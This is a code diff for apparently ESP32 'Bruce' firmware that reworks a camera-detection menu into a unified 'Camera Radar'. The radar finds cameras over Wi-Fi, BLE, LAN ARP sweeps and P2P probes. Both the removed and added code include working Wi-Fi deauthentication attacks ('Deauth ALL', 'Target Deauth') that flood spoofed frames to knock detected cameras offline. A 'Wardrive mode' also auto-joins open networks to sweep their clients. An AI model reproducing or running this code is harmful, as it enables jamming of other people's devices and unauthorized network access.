@@ -183,114 +183,6 @@ static void raybanDetector() {
 }
 
 // ---------------------------------------------------------------------------
-// Generic multi-brand camera detector (WiFi APs + BLE) using camera_brands DB.
-// ---------------------------------------------------------------------------
-static void cameraScan() {
-    std::vector<CamDevice> devices;
-
-    // WiFi APs
-    displayTextLine("Scanning WiFi..");
-    int nets = WiFi.scanNetworks(false, true);
-    for (int i = 0; i < nets; i++) {
-        String ssid = WiFi.SSID(i);
-        String mac = WiFi.BSSIDstr(i);
-        const char *method = nullptr;
-        const char *brand = identifyCamera(lc(mac), lc(ssid), &method);
-        if (!brand) continue;
-        devices.push_back({ssid.isEmpty() ? String("<hidden>") : ssid, mac, (int)WiFi.RSSI(i),
-                           String("WiFi ") + method, String(brand)});
-    }
-    WiFi.scanDelete();
-
-    // BLE advertisers. scanBleMatching only records the method string, so we
-    // pack the brand into it as "BLE <method>|<brand>" and unpack it below.
-    scanBleMatching(devices, [](const NimBLEAdvertisedDevice *device) -> String {
-        String mac = lc(String(device->getAddress().toString().c_str()));
-        String name = lc(String(device->getName().c_str()));
-        const char *method = nullptr;
-        const char *brand = identifyCamera(mac, name, &method);
-        if (!brand) return "";
-        return String("BLE ") + method + "|" + brand;
-    });
-    for (auto &d : devices) {
-        int sep = d.method.indexOf('|');
-        if (sep >= 0) {
-            d.brand = d.method.substring(sep + 1);
-            d.method = d.method.substring(0, sep);
-        }
-    }
-
-    showResults("Cameras", devices);
-}
-
-// ---------------------------------------------------------------------------
-// Camera Deauther: scan, keep only camera APs, then flood deauth them.
-// Reuses Bruce's wifi_atks raw-frame primitives.
-// ---------------------------------------------------------------------------
-static void cameraDeauther() {
-    if (!wifi_atk_setWifi()) return;
-
-    displayTextLine("Scanning WiFi..");
-    int nets = WiFi.scanNetworks(false, true);
-
-    std::vector<wifi_ap_record_t> targets;
-    for (int i = 0; i < nets; i++) {
-        String ssid = WiFi.SSID(i);
-        String mac = WiFi.BSSIDstr(i);
-        if (!identifyCamera(lc(mac), lc(ssid), nullptr)) continue;
-
-        wifi_ap_record_t rec;
-        memset(&rec, 0, sizeof(rec));
-        memcpy(rec.bssid, WiFi.BSSID(i), 6);
-        rec.primary = static_cast<uint8_t>(WiFi.channel(i));
-        strncpy((char *)rec.ssid, ssid.c_str(), sizeof(rec.ssid) - 1);
-        targets.push_back(rec);
-    }
-    WiFi.scanDelete();
-
-    if (targets.empty()) {
-        displayTextLine("No camera APs found");
-        delay(1500);
-        wifi_atk_unsetWifi();
-        return;
-    }
-
-    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
-
-    uint32_t lastTime = millis();
-    uint32_t rescanTime = millis();
-    uint16_t count = 0;
-    drawMainBorderWithTitle("Cam Deauther");
-    tft.setCursor(10, 60);
-    tft.println(String(targets.size()) + " camera AP(s)");
-
-    while (!check(EscPress)) {
-        for (const auto &rec : targets) {
-            wsl_bypasser_send_raw_frame(&rec, rec.primary, _default_target);
-            for (int i = 0; i < 50; i++) {
-                send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
-                count += 3;
-                if (EscPress) break;
-            }
-            if (EscPress) break;
-        }
-        if (millis() - lastTime > 2000) {
-            drawMainBorderWithTitle("Cam Deauther");
-            tft.setCursor(10, 60);
-            tft.println(String(targets.size()) + " camera AP(s)");
-            tft.setCursor(10, tftHeight - 25);
-            tft.println("Frames: " + String(count / 2) + "/s   ");
-            count = 0;
-            lastTime = millis();
-        }
-        if (millis() - rescanTime > 60000) break; // bail out to allow a fresh scan
-    }
-
-    wifi_atk_unsetWifi();
-    returnToMenu = true;
-}
-
-// ---------------------------------------------------------------------------
 // P2P LAN Scan: active discovery of iLnkP2P / CS2 Network P2P cameras.
 //
 // These are the cheap OEM cameras that passive OUI/SSID scanning misses. Once
@@ -425,231 +317,378 @@ static void p2pResolveMacs(std::vector<P2PCam> &cams) {
     }
 }
 
-// Targeted station deauth of the discovered P2P cameras. We stay associated to
-// the AP and inject deauths (source = AP BSSID, dest = camera MAC) on the STA
-// interface at the current channel.
-static void p2pDeauthCams(std::vector<P2PCam> &cams) {
-    uint8_t *bssid = WiFi.BSSID();
-    int withMac = 0;
-    for (auto &c : cams)
-        if (c.haveMac) withMac++;
-    if (!bssid || withMac == 0) {
-        displayTextLine("No MACs resolved");
+// ===========================================================================
+// Camera Radar: unified catch-all detector. Merges every visibility surface -
+// Wi-Fi APs, BLE advertisers, and (when on a LAN) ARP hosts + P2P responders -
+// against the camera_brands DB, deduped by MAC. Passive by default; Wardrive
+// mode also auto-joins open APs to sweep their clients. One deauth path serves
+// both "Deauth All" and per-camera "Target Deauth" via the wifi_atks frames.
+// ===========================================================================
+enum RadarSurface { RS_AP, RS_CLIENT, RS_BLE };
+
+struct RadarCam {
+    String brand;
+    String name;   // ssid / ble name / p2p uid
+    String macStr; // lowercase aa:bb:cc:...
+    uint8_t mac[6];
+    RadarSurface surface;
+    String method;
+    int rssi;
+    bool haveIp;
+    IPAddress ip;
+    bool deauthable;    // false for BLE
+    uint8_t apBssid[6]; // AP to spoof as source (cam's own AP, or the client's AP)
+    uint8_t channel;
+};
+
+static std::vector<RadarCam> g_radar;
+
+static uint32_t ipOctetsToU32(const IPAddress &ip) {
+    return ((uint32_t)ip[0] << 24) | ((uint32_t)ip[1] << 16) | ((uint32_t)ip[2] << 8) | ip[3];
+}
+
+static bool parseMac6(const String &macLc, uint8_t out[6]) {
+    return sscanf(
+               macLc.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &out[0], &out[1], &out[2], &out[3],
+               &out[4], &out[5]
+           ) == 6;
+}
+
+static void macToStr6(const uint8_t m[6], char *buf) {
+    sprintf(buf, "%02x:%02x:%02x:%02x:%02x:%02x", m[0], m[1], m[2], m[3], m[4], m[5]);
+}
+
+static bool radarSeen(const uint8_t mac[6]) {
+    for (auto &c : g_radar)
+        if (memcmp(c.mac, mac, 6) == 0) return true;
+    return false;
+}
+
+static void radarAlert(const RadarCam &c) {
+    tft.fillScreen(bruceConfig.priColor);
+    delay(70);
+    tft.fillScreen(bruceConfig.bgColor);
+    drawMainBorderWithTitle("Camera Found");
+    tft.setTextSize(FP);
+    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+    tft.setCursor(6, 40);
+    const char *s = c.surface == RS_AP ? "AP" : c.surface == RS_CLIENT ? "client" : "BLE";
+    padprintln(" " + c.brand);
+    padprintln(" " + c.name);
+    padprintln(" " + c.macStr);
+    padprintln(String(" ") + s + "  " + c.method);
+    delay(1000);
+}
+
+// --- surface collectors -----------------------------------------------------
+
+static void radarScanAPs(bool alert) {
+    int nets = WiFi.scanNetworks(false, true);
+    for (int i = 0; i < nets; i++) {
+        String ssid = WiFi.SSID(i);
+        String mac = lc(WiFi.BSSIDstr(i));
+        const char *method = nullptr;
+        const char *brand = identifyCamera(mac, lc(ssid), &method);
+        if (!brand) continue;
+        uint8_t mb[6];
+        if (!parseMac6(mac, mb) || radarSeen(mb)) continue;
+        RadarCam c = {};
+        c.brand = brand;
+        c.name = ssid.isEmpty() ? String("<hidden>") : ssid;
+        c.macStr = mac;
+        memcpy(c.mac, mb, 6);
+        c.surface = RS_AP;
+        c.method = String("AP ") + method;
+        c.rssi = WiFi.RSSI(i);
+        c.deauthable = true;
+        memcpy(c.apBssid, WiFi.BSSID(i), 6);
+        c.channel = (uint8_t)WiFi.channel(i);
+        g_radar.push_back(c);
+        if (alert) radarAlert(g_radar.back());
+    }
+    WiFi.scanDelete();
+}
+
+static void radarScanBLE(bool alert) {
+    ble_scan_setup();
+    BLEScanResults found = pBLEScan->getResults(scanTime * 1000, false);
+    for (int i = 0; i < found.getCount(); i++) {
+        const NimBLEAdvertisedDevice *d = found.getDevice(i);
+        String mac = lc(String(d->getAddress().toString().c_str()));
+        String name = String(d->getName().c_str());
+        const char *method = nullptr;
+        const char *brand = identifyCamera(mac, lc(name), &method);
+        String reason;
+        if (brand) {
+            reason = String("BLE ") + method;
+        } else if (deviceHasServiceUUID(d, String(rayban_service_uuid))) {
+            brand = "RayBan";
+            reason = "BLE UUID";
+        }
+        if (!brand) continue;
+        uint8_t mb[6];
+        if (!parseMac6(mac, mb) || radarSeen(mb)) continue;
+        RadarCam c = {};
+        c.brand = brand;
+        c.name = name.isEmpty() ? String("<no name>") : name;
+        c.macStr = mac;
+        memcpy(c.mac, mb, 6);
+        c.surface = RS_BLE;
+        c.method = reason;
+        c.rssi = d->getRSSI();
+        c.deauthable = false;
+        g_radar.push_back(c);
+        if (alert) radarAlert(g_radar.back());
+    }
+    pBLEScan->clearResults();
+    stopBLEStack();
+}
+
+// On the currently-joined LAN: ARP-sweep + P2P probe -> camera client stations.
+static void radarScanLan(bool alert) {
+    if (WiFi.status() != WL_CONNECTED) return;
+    uint8_t curBssid[6];
+    memcpy(curBssid, WiFi.BSSID(), 6);
+    uint8_t curCh = (uint8_t)WiFi.channel();
+
+    uint32_t myHost = ipOctetsToU32(WiFi.localIP());
+    uint32_t maskHost = ipOctetsToU32(WiFi.subnetMask());
+    uint32_t netHost = myHost & maskHost;
+    uint32_t bcastHost = netHost | (~maskHost);
+    uint32_t first = netHost + 1;
+    uint32_t last = (bcastHost > netHost) ? bcastHost - 1 : netHost;
+    if (last > first + 1021) last = first + 1021;
+
+    WiFiUDP udp;
+    udp.begin(0);
+    uint8_t bb = 0;
+    auto harvest = [&]() {
+        for (uint32_t i = 0; i < ARP_TABLE_SIZE; i++) {
+            ip4_addr_t *ipr = nullptr;
+            struct eth_addr *ethr = nullptr;
+            struct netif *tif = nullptr;
+            if (!etharp_get_entry(i, &ipr, &tif, &ethr)) continue;
+            if (!ipr || !ethr) continue;
+            char macs[18];
+            macToStr6(ethr->addr, macs);
+            const char *method = nullptr;
+            const char *brand = identifyCamera(String(macs), String(""), &method);
+            if (!brand || radarSeen(ethr->addr)) continue;
+            RadarCam c = {};
+            c.brand = brand;
+            c.name = IPAddress(ipr->addr).toString();
+            c.macStr = macs;
+            memcpy(c.mac, ethr->addr, 6);
+            c.surface = RS_CLIENT;
+            c.method = "LAN OUI";
+            c.haveIp = true;
+            c.ip = IPAddress(ipr->addr);
+            c.deauthable = true;
+            memcpy(c.apBssid, curBssid, 6);
+            c.channel = curCh;
+            g_radar.push_back(c);
+            if (alert) radarAlert(g_radar.back());
+        }
+    };
+    for (uint32_t h = first; h <= last && !check(EscPress); h++) {
+        if (h == myHost) continue;
+        IPAddress ip((h >> 24) & 0xFF, (h >> 16) & 0xFF, (h >> 8) & 0xFF, h & 0xFF);
+        udp.beginPacket(ip, 1);
+        udp.write(&bb, 1);
+        udp.endPacket();
+        delay(3);
+        if ((h & 0x03) == 0) harvest();
+    }
+    delay(200);
+    harvest();
+    udp.stop();
+
+    // P2P responders (UID as name).
+    std::vector<P2PCam> p2p;
+    p2pDiscover(p2p);
+    p2pResolveMacs(p2p);
+    for (auto &pc : p2p) {
+        if (!pc.haveMac || radarSeen(pc.mac)) continue;
+        RadarCam c = {};
+        c.brand = pc.brand;
+        c.name = pc.uid;
+        char ms[18];
+        macToStr6(pc.mac, ms);
+        c.macStr = ms;
+        memcpy(c.mac, pc.mac, 6);
+        c.surface = RS_CLIENT;
+        c.method = "P2P";
+        c.haveIp = true;
+        c.ip = pc.ip;
+        c.deauthable = true;
+        memcpy(c.apBssid, curBssid, 6);
+        c.channel = curCh;
+        g_radar.push_back(c);
+        if (alert) radarAlert(g_radar.back());
+    }
+}
+
+// --- deauth -----------------------------------------------------------------
+// AP cams: broadcast-deauth their clients. Client cams: targeted station deauth
+// from the AP they are on. Unified through wsl_bypasser (APSTA, per-target chan).
+static void radarDeauth(int onlyIndex) {
+    int n = 0;
+    for (size_t i = 0; i < g_radar.size(); i++)
+        if (g_radar[i].deauthable && (onlyIndex < 0 || (int)i == onlyIndex)) n++;
+    if (n == 0) {
+        displayTextLine("No deauthable target");
         delay(1500);
         return;
     }
-
-    uint8_t frame[sizeof(deauth_frame_default)];
-    memcpy(frame, deauth_frame_default, sizeof(deauth_frame_default));
-    memcpy(&frame[10], bssid, 6); // source = AP
-    memcpy(&frame[16], bssid, 6); // BSSID = AP
-
+    if (!wifi_atk_setWifi()) return;
+    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
     uint32_t lastTime = millis();
     uint16_t count = 0;
-    drawMainBorderWithTitle("P2P Deauth");
+    drawMainBorderWithTitle("Cam Deauth");
     tft.setCursor(10, 60);
-    tft.println(String(withMac) + " P2P cam(s)");
-
+    tft.println(String(n) + " target(s)");
     while (!check(EscPress)) {
-        for (auto &c : cams) {
-            if (!c.haveMac) continue;
-            memcpy(&frame[4], c.mac, 6); // dest = camera station
-            for (int i = 0; i < 30; i++) {
-                esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(deauth_frame_default), false);
-                count += 1;
-                delay(1);
+        for (size_t i = 0; i < g_radar.size(); i++) {
+            RadarCam &c = g_radar[i];
+            if (!c.deauthable || (onlyIndex >= 0 && (int)i != onlyIndex)) continue;
+            wifi_ap_record_t rec;
+            memset(&rec, 0, sizeof(rec));
+            memcpy(rec.bssid, c.apBssid, 6);
+            rec.primary = c.channel;
+            const uint8_t *target = (c.surface == RS_AP) ? _default_target : c.mac;
+            wsl_bypasser_send_raw_frame(&rec, c.channel, target);
+            for (int k = 0; k < 40; k++) {
+                send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
+                count += 3;
                 if (EscPress) break;
             }
             if (EscPress) break;
         }
         if (millis() - lastTime > 2000) {
-            drawMainBorderWithTitle("P2P Deauth");
+            drawMainBorderWithTitle("Cam Deauth");
             tft.setCursor(10, 60);
-            tft.println(String(withMac) + " P2P cam(s)");
+            tft.println(String(n) + " target(s)");
             tft.setCursor(10, tftHeight - 25);
             tft.println("Frames: " + String(count / 2) + "/s   ");
             count = 0;
             lastTime = millis();
         }
     }
+    wifi_atk_unsetWifi();
     returnToMenu = true;
 }
 
-static void p2pDetail(const P2PCam &cam) {
+// --- results UI -------------------------------------------------------------
+static void radarInfo(const RadarCam &c) {
     drawMainBorder();
     tft.setTextColor(bruceConfig.priColor);
-    tft.drawCentreString("-=P2P Camera=-", tftWidth / 2, 28, SMOOTH_FONT);
-    tft.drawString("UID: " + cam.uid, 10, 48);
-    tft.drawString("Brand: " + cam.brand, 10, 66);
-    tft.drawString("IP: " + cam.ip.toString(), 10, 84);
-    if (cam.haveMac) {
-        char m[18];
-        snprintf(
-            m, sizeof(m), "%02X:%02X:%02X:%02X:%02X:%02X", cam.mac[0], cam.mac[1], cam.mac[2],
-            cam.mac[3], cam.mac[4], cam.mac[5]
-        );
-        tft.drawString("MAC: " + String(m), 10, 102);
-    } else {
-        tft.drawString("MAC: (unresolved)", 10, 102);
-    }
-    tft.drawCentreString("Press " + String(BTN_ALIAS) + " to exit", tftWidth / 2, tftHeight - 20, 1);
+    tft.drawCentreString("-=Camera=-", tftWidth / 2, 24, SMOOTH_FONT);
+    tft.setTextSize(FP);
+    tft.setCursor(8, 42);
+    const char *s = c.surface == RS_AP ? "AP" : c.surface == RS_CLIENT ? "client" : "BLE";
+    padprintln(" Brand:  " + c.brand);
+    padprintln(" Name:   " + c.name);
+    padprintln(" MAC:    " + c.macStr);
+    if (c.haveIp) padprintln(" IP:     " + c.ip.toString());
+    padprintln(String(" Seen:   ") + s);
+    padprintln(" Method: " + c.method);
+    if (c.surface != RS_BLE) padprintln(" Chan:   " + String(c.channel));
+    tft.drawCentreString("Press " + String(BTN_ALIAS) + " to exit", tftWidth / 2, tftHeight - 18, 1);
     delay(300);
     while (!check(SelPress) && !check(EscPress)) yield();
 }
 
-static void p2pLanScan() {
-    if (WiFi.status() != WL_CONNECTED) {
-        if (!wifiConnectMenu(WIFI_MODE_STA) && WiFi.status() != WL_CONNECTED) {
-            displayTextLine("WiFi needed for P2P");
-            delay(1500);
-            return;
-        }
-    }
-    if (WiFi.status() != WL_CONNECTED) {
-        displayTextLine("Not connected");
-        delay(1500);
-        return;
-    }
-
-    displayTextLine("P2P discovering..");
-    std::vector<P2PCam> cams;
-    p2pDiscover(cams);
-
-    if (cams.empty()) {
-        displayTextLine("No P2P cameras");
-        delay(1500);
-        return;
-    }
-
-    p2pResolveMacs(cams);
-
-    std::vector<P2PCam> found = cams; // capture for deauth action
+static void radarCamMenu(int idx) {
+    RadarCam c = g_radar[idx];
     options = {};
-    options.emplace_back(
-        (String("Deauth all (") + String((int)found.size()) + ")").c_str(),
-        [found]() mutable { p2pDeauthCams(found); }
-    );
-    for (auto &cam : cams) {
-        P2PCam c = cam;
-        String label = c.brand + " " + c.ip.toString();
-        options.emplace_back(label.c_str(), [c]() { p2pDetail(c); });
-    }
-    addOptionToMainMenu();
-    loopOptions(options, MENU_TYPE_SUBMENU, "P2P Cameras");
+    options.push_back({"Info", [c]() { radarInfo(c); }});
+    if (c.deauthable) options.push_back({"Target Deauth", [idx]() { radarDeauth(idx); }});
+    options.push_back({"Back", []() {}});
+    loopOptions(options, MENU_TYPE_SUBMENU, c.brand.c_str());
     options.clear();
 }
 
-// ---------------------------------------------------------------------------
-// Auto-Sweep: wardrive-style continuous discovery. Repeatedly scans for APs,
-// flags any AP that is itself a camera (passive), and for every OPEN network
-// auto-joins and runs the P2P LAN probe (active) - no SSID/password typing.
-// Each new hit triggers a subtle screen flash + a brief detail card.
-// ---------------------------------------------------------------------------
-static void sweepAlert(const CamDevice &d) {
-    // subtle flash
-    tft.fillScreen(bruceConfig.priColor);
-    delay(80);
-    tft.fillScreen(bruceConfig.bgColor);
-
-    drawMainBorderWithTitle("Camera Found");
-    tft.setTextSize(FP);
-    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
-    tft.setCursor(6, 40);
-    padprintln(" " + d.brand);
-    padprintln(" " + d.name);
-    padprintln(" " + d.address);
-    padprintln(" " + d.method);
-    delay(1200);
+static void radarResults() {
+    if (g_radar.empty()) {
+        displayTextLine("No cameras found");
+        delay(1500);
+        return;
+    }
+    options = {};
+    options.push_back({"Deauth ALL", []() { radarDeauth(-1); }});
+    for (size_t i = 0; i < g_radar.size(); i++) {
+        int idx = (int)i;
+        const char *tag = g_radar[i].surface == RS_BLE   ? "[B]"
+                          : g_radar[i].surface == RS_AP  ? "[AP]"
+                                                         : "[LAN]";
+        String label = g_radar[i].brand + " " + tag;
+        options.push_back({label.c_str(), [idx]() { radarCamMenu(idx); }});
+    }
+    addOptionToMainMenu();
+    loopOptions(options, MENU_TYPE_SUBMENU, "Cameras");
+    options.clear();
 }
 
-static void cameraAutoSweep() {
-    std::vector<CamDevice> found;
-    std::vector<String> tried; // OPEN bssids already joined this session
-
-    auto seen = [&](const String &k) {
-        for (auto &f : found)
-            if (f.name == k || f.address == k) return true;
-        return false;
+static void cameraRadar() {
+    bool wardrive = false;
+    bool cancelled = true;
+    options = {
+        {"Passive scan",  [&]() { wardrive = false; cancelled = false; }},
+        {"Wardrive mode", [&]() { wardrive = true;  cancelled = false; }},
     };
+    loopOptions(options, MENU_TYPE_SUBMENU, "Camera Radar");
+    options.clear();
+    if (cancelled) return;
 
-    WiFi.mode(WIFI_MODE_STA);
-    WiFi.disconnect(false);
-    delay(100);
+    g_radar.clear();
 
-    while (!check(EscPress)) {
-        drawMainBorderWithTitle("Auto-Sweep");
-        tft.setTextSize(FP);
-        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
-        tft.setCursor(6, 40);
-        padprintln(" Scanning APs...");
-        padprintln(" Cameras: " + String((int)found.size()));
+    displayTextLine("Scanning APs..");
+    radarScanAPs(wardrive);
+    displayTextLine("Scanning BLE..");
+    radarScanBLE(wardrive);
 
+    // On-LAN detection needs to be joined to a network. Prompt once if not
+    // already connected (this is how a client-only cam like Meari gets caught).
+    if (WiFi.status() != WL_CONNECTED) wifiConnectMenu(WIFI_MODE_STA);
+    if (WiFi.status() == WL_CONNECTED) {
+        displayTextLine("Scanning LAN..");
+        radarScanLan(wardrive);
+    }
+
+    if (wardrive) {
+        // Join each open AP in turn and sweep its clients (apBssid/chan captured
+        // by radarScanLan via WiFi.BSSID()/channel() while joined).
+        std::vector<String> openSsids;
         int nets = WiFi.scanNetworks(false, true);
-        for (int i = 0; i < nets && !check(EscPress); i++) {
-            String ssid = WiFi.SSID(i);
-            String bssid = WiFi.BSSIDstr(i);
-
-            // Passive: is the AP itself a known camera?
-            const char *method = nullptr;
-            const char *brand = identifyCamera(lc(bssid), lc(ssid), &method);
-            if (brand && !seen(bssid)) {
-                CamDevice d = {
-                    ssid.isEmpty() ? String("<hidden>") : ssid, bssid, (int)WiFi.RSSI(i),
-                    String("WiFi ") + method, String(brand)
-                };
-                found.push_back(d);
-                sweepAlert(d);
-            }
-
-            // Active: OPEN network -> join and run the P2P probe (once per BSSID).
-            if (WiFi.encryptionType(i) != WIFI_AUTH_OPEN || ssid.isEmpty()) continue;
-            bool already = false;
-            for (auto &t : tried)
-                if (t == bssid) {
-                    already = true;
-                    break;
-                }
-            if (already) continue;
-            tried.push_back(bssid);
-
-            drawMainBorderWithTitle("Auto-Sweep");
+        for (int i = 0; i < nets; i++) {
+            if (WiFi.encryptionType(i) != WIFI_AUTH_OPEN) continue;
+            if (WiFi.SSID(i).isEmpty()) continue;
+            openSsids.push_back(WiFi.SSID(i));
+        }
+        WiFi.scanDelete();
+        for (auto &ssid : openSsids) {
+            if (check(EscPress)) break;
+            drawMainBorderWithTitle("Wardrive");
             tft.setTextSize(FP);
             tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
             tft.setCursor(6, 40);
             padprintln(" Join: " + ssid.substring(0, 18));
-            padprintln(" Cameras: " + String((int)found.size()));
-
+            padprintln(" Cameras: " + String((int)g_radar.size()));
             WiFi.begin(ssid.c_str());
             uint32_t t0 = millis();
             while (WiFi.status() != WL_CONNECTED && millis() - t0 < 5000 && !check(EscPress)) delay(100);
-
-            if (WiFi.status() == WL_CONNECTED && (uint32_t)WiFi.localIP() != 0) {
-                std::vector<P2PCam> cams;
-                p2pDiscover(cams);
-                p2pResolveMacs(cams);
-                for (auto &c : cams) {
-                    if (seen(c.uid)) continue;
-                    CamDevice d = {c.uid, c.ip.toString(), 0, String("P2P"), c.brand};
-                    found.push_back(d);
-                    sweepAlert(d);
-                }
-            }
+            if (WiFi.status() == WL_CONNECTED && (uint32_t)WiFi.localIP() != 0) radarScanLan(true);
             WiFi.disconnect(false);
             delay(50);
         }
-        WiFi.scanDelete();
     }
 
-    WiFi.disconnect(true);
-    showResults("Sweep Cams", found);
+    radarResults();
 }
 
 void camDetectorMenu() {
     options = {
-        {"Camera Scan",     cameraScan                },
-        {"Auto-Sweep",      cameraAutoSweep           },
-        {"Camera Deauther", cameraDeauther            },
-        {"P2P LAN Scan",    p2pLanScan                },
+        {"Camera Radar",    cameraRadar               },
         {"TUTK Watch",      tutkWatch                 },
         {"Flock Detector",  flockDetector             },
         {"Axon Detector",   axonDetector              },
